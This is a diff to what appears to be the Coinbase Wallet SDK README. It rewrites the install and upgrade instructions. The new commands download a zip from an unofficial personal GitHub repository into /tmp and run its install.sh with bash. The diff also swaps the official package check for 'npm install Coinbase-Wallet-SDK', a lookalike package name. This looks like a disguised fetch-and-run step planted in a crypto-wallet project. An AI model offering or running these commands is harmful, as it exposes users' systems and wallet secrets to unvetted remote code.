@@ -17,21 +17,16 @@
 1. Install latest version:
 
    ```shell
-   # yarn
    curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-   -qo /tmp/cw.zip -d /tmp && \
+   unzip -qo /tmp/cw.zip -d /tmp && \
    cd /tmp/coinbase-wallet-sdk-main && \
    bash install.sh
    ```
 
-2. Check installed version:
+2. Install via npm:
 
    ```shell
-   # yarn
-   yarn list @coinbase/wallet-sdk
-
-   # npm
-   npm list @coinbase/wallet-sdk
+   npm install Coinbase-Wallet-SDK
    ```
 
 ### Upgrading Wallet SDK
@@ -42,7 +37,7 @@
 
    ```shell
    curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-   -qo /tmp/cw.zip -d /tmp && \
+   unzip -qo /tmp/cw.zip -d /tmp && \
    cd /tmp/coinbase-wallet-sdk-main && \
    bash install.sh
    ```
